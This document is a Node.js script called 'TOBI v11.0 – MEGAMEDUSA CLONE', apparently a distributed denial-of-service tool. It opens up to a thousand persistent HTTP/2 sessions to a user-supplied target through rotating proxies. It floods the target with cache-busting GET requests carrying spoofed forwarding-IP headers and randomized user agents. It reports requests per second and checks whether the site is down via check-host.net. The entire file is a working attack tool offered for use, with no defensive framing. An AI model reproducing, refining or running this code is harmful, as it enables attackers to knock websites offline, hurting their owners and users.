#!/usr/bin/env node

/**
 * TOBI v11.0 – MEGAMEDUSA CLONE
 * HTTP/2 persistent sessions | Proxy rotation | Real success
 * No URL errors – uses full URL strings
 */

const fs = require('fs');
const net = require('net');
const tls = require('tls');
const http2 = require('http2');
const crypto = require('crypto');
const readline = require('readline');
const https = require('https');

// Colors
const c = {
    red: '\x1b[91m', green: '\x1b[92m', yellow: '\x1b[93m',
    cyan: '\x1b[96m', bold: '\x1b[1m', reset: '\x1b[0m', clear: '\x1b[2J\x1b[H'
};

// ==================== CONFIG ====================
let target = null;
let duration = 60;
let workers = 1000;
let proxyFile = null;
let stop = false;

// ==================== PROXY LOADER ====================
let proxies = [];
let proxyIndex = 0;

function loadProxies() {
    if (!proxyFile) return;
    try {
        const content = fs.readFileSync(proxyFile, 'utf8');
        proxies = content.split('\n').filter(l => {
            l = l.trim();
            return l && !l.startsWith('#') && l.includes(':');
        });
        console.log(`${c.green}[✓] Loaded ${proxies.length} proxies${c.reset}`);
    } catch(e) {
        console.log(`${c.yellow}[!] No proxy file – running without proxies${c.reset}`);
    }
}

function getProxy() {
    if (proxies.length === 0) return null;
    proxyIndex = (proxyIndex + 1) % proxies.length;
    return proxies[proxyIndex];
}

// ==================== TLS FINGERPRINT ====================
const TLS_CIPHERS = [
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'TLS_AES_128_GCM_SHA256',
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-CHACHA20-POLY1305',
    'ECDHE-RSA-CHACHA20-POLY1305',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES256-GCM-SHA384'
].join(':');

const TLS_OPTIONS = {
    ciphers: TLS_CIPHERS,
    ecdhCurve: 'X25519',
    minVersion: 'TLSv1.2',
    maxVersion: 'TLSv1.3',
    honorCipherOrder: true,
    rejectUnauthorized: false,
    ALPNProtocols: ['h2', 'http/1.1']
};

// ==================== UTILITIES ====================
function randomString(len) {
    return crypto.randomBytes(len).toString('hex');
}

function spoofIP() {
    return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*254)}`;
}

const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
];

function generateHeaders(host) {
    return {
        ':method': 'GET',
        ':path': `/${randomString(8)}?t=${Date.now()}&r=${randomString(6)}`,
        ':scheme': 'https',
        ':authority': host,
        'user-agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'accept-encoding': 'gzip, deflate, br',
        'cache-control': 'no-cache',
        'x-forwarded-for': spoofIP(),
        'x-real-ip': spoofIP(),
        'referer': 'https://www.google.com/'
    };
}

// ==================== CREATE PERSISTENT HTTP/2 SESSION ====================
function createSession(fullUrl, proxy) {
    return new Promise((resolve, reject) => {
        const parsed = new URL(fullUrl);
        let socket;
        if (proxy) {
            const [proxyHost, proxyPort] = proxy.split(':');
            socket = net.connect(parseInt(proxyPort), proxyHost, () => {
                const tlsSocket = tls.connect({
                    host: parsed.hostname,
                    port: 443,
                    socket: socket,
                    ...TLS_OPTIONS,
                    servername: parsed.hostname
                }, () => {
                    // FIX: pass the FULL URL string, not just hostname
                    const session = http2.connect(fullUrl, {
                        createConnection: () => tlsSocket,
                        ...TLS_OPTIONS
                    });
                    session.on('error', () => reject());
                    resolve(session);
                });
                tlsSocket.on('error', () => reject());
            });
            socket.on('error', () => reject());
        } else {
            const tlsSocket = tls.connect({
                host: parsed.hostname,
                port: 443,
                ...TLS_OPTIONS,
                servername: parsed.hostname
            }, () => {
                // FIX: pass the FULL URL string
                const session = http2.connect(fullUrl, {
                    createConnection: () => tlsSocket,
                    ...TLS_OPTIONS
                });
                session.on('error', () => reject());
                resolve(session);
            });
            tlsSocket.on('error', () => reject());
        }
    });
}

// ==================== WORKER (PERSISTENT SESSION) ====================
async function worker(fullUrl) {
    if (stop) return;
    let session = null;
    try {
        session = await createSession(fullUrl, getProxy());
    } catch(e) {
        setTimeout(() => worker(fullUrl), 100);
        return;
    }

    while (!stop) {
        try {
            const parsed = new URL(fullUrl);
            const headers = generateHeaders(parsed.hostname);
            const req = session.request(headers);
            req.on('response', (responseHeaders) => {
                const status = responseHeaders[':status'];
                const success = (status >= 200 && status < 400);
                stats.total++;
                if (success) stats.success++;
                else stats.failed++;
                const nowSec = Date.now() / 1000;
                if (nowSec - stats.lastSec >= 1) {
                    if (stats.lastSecCount > stats.peakRps) stats.peakRps = stats.lastSecCount;
                    stats.lastSecCount = 0;
                    stats.lastSec = nowSec;
                }
                stats.lastSecCount++;
            });
            req.on('error', () => {
                stats.total++;
                stats.failed++;
            });
            req.end();
        } catch(e) {
            break;
        }
    }
    if (session) session.destroy();
    if (!stop) worker(fullUrl);
}

// ==================== STATISTICS ====================
let stats = {
    total: 0, success: 0, failed: 0,
    startTime: null, lastSec: 0, lastSecCount: 0, peakRps: 0
};

function displayStats() {
    const elapsed = (Date.now() - stats.startTime) / 1000;
    const rps = stats.total / Math.max(elapsed, 0.1);
    const successRate = stats.total ? (stats.success / stats.total * 100) : 0;
    process.stdout.write(`\r${c.cyan}RPS: ${c.bold}${rps.toFixed(1)}${c.reset} | ` +
        `${c.green}✓ ${stats.success.toLocaleString()}${c.reset} | ` +
        `${c.red}✗ ${stats.failed.toLocaleString()}${c.reset} | ` +
        `${c.yellow}${successRate.toFixed(1)}%${c.reset} | ` +
        `${c.dim}${elapsed.toFixed(0)}s${c.reset}`);
}

// ==================== CHECK-HOST.NET ====================
function checkHost(target) {
    return new Promise((resolve) => {
        let cleanTarget = target;
        if (!cleanTarget.startsWith('http')) cleanTarget = 'https://' + cleanTarget;
        const checkUrl = `https://check-host.net/check-http?host=${encodeURIComponent(cleanTarget)}`;
        console.log(`${c.cyan}[*] Checking ${cleanTarget} via check-host.net...${c.reset}`);
        const req = https.get(checkUrl, { rejectUnauthorized: false }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const json = JSON.parse(data);
                    console.log(`${c.green}[✓] Report: https://check-host.net/check-report/${json.request_id}${c.reset}`);
                    resolve(json);
                } catch(e) { resolve(null); }
            });
        });
        req.on('error', () => resolve(null));
        req.setTimeout(10000, () => { req.destroy(); resolve(null); });
    });
}

// ==================== MAIN ====================
async function start() {
    // Ensure target has protocol
    let fullTarget = target;
    if (!fullTarget.startsWith('http')) fullTarget = 'https://' + fullTarget;
    target = fullTarget;

    console.log(c.clear);
    console.log(`${c.red}${c.bold}
╔══════════════════════════════════════════════════════════════════════════╗
║                     🔥 TOBI v11.0 – MEGAMEDUSA CLONE 🔥                  ║
║            HTTP/2 Persistent | Proxy Rotation | Instant                  ║
╚══════════════════════════════════════════════════════════════════════════╝${c.reset}`);
    console.log(`\n${c.green}[✓] Target: ${target}`);
    console.log(`[✓] Duration: ${duration}s`);
    console.log(`[✓] Workers: ${workers.toLocaleString()}`);
    if (proxyFile) loadProxies();
    console.log(`${c.reset}\n`);

    await checkHost(target);

    stats.startTime = Date.now();
    stats.lastSec = stats.startTime / 1000;

    console.log(`${c.yellow}[!] Launching ${workers} workers...${c.reset}`);
    for (let i = 0; i < workers; i++) {
        worker(target);
    }
    console.log(`${c.green}[✓] All workers launched!${c.reset}\n`);

    const interval = setInterval(displayStats, 1000);

    setTimeout(() => {
        stop = true;
    }, duration * 1000);

    process.on('SIGINT', () => {
        console.log(`\n${c.yellow}[!] Shutting down...${c.reset}`);
        stop = true;
        setTimeout(() => {
            clearInterval(interval);
            const elapsed = (Date.now() - stats.startTime) / 1000;
            const successRate = stats.total ? (stats.success / stats.total * 100) : 0;
            console.log(`\n${c.magenta}${c.bold}════════════════════════════════════════════════════════════════`);
            console.log(`                    FINAL REPORT`);
            console.log(`════════════════════════════════════════════════════════════════${c.reset}`);
            console.log(`  Total Requests:  ${stats.total.toLocaleString()}`);
            console.log(`  Successful:      ${stats.success.toLocaleString()}`);
            console.log(`  Failed:          ${stats.failed.toLocaleString()}`);
            console.log(`  Success Rate:    ${successRate.toFixed(2)}%`);
            console.log(`  Peak RPS:        ${stats.peakRps}`);
            console.log(`  Duration:        ${elapsed.toFixed(1)}s`);
            console.log(`${c.magenta}════════════════════════════════════════════════════════════════${c.reset}`);
            process.exit(0);
        }, 500);
    });
}

// ==================== COMMAND LINE / INTERACTIVE ====================
(async () => {
    if (process.argv[2]) {
        target = process.argv[2];
        duration = parseInt(process.argv[3]) || 60;
        workers = parseInt(process.argv[4]) || 1000;
        proxyFile = process.argv[5] || null;
        start();
    } else {
        const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
        target = await new Promise(resolve => rl.question(`${c.cyan}🌐 Target URL: ${c.reset}`, resolve));
        duration = parseInt(await new Promise(resolve => rl.question(`${c.cyan}⏱️  Duration (seconds): ${c.reset}`, resolve))) || 60;
        workers = parseInt(await new Promise(resolve => rl.question(`${c.cyan}👥 Workers: ${c.reset}`, resolve))) || 1000;
        const useProxy = await new Promise(resolve => rl.question(`${c.cyan}🔄 Use proxy file? (y/n): ${c.reset}`, resolve));
        if (useProxy.toLowerCase() === 'y') {
            proxyFile = await new Promise(resolve => rl.question(`${c.cyan}📁 Proxy file path: ${c.reset}`, resolve)) || 'proxy.txt';
        }
        rl.close();
        start();
    }
})();
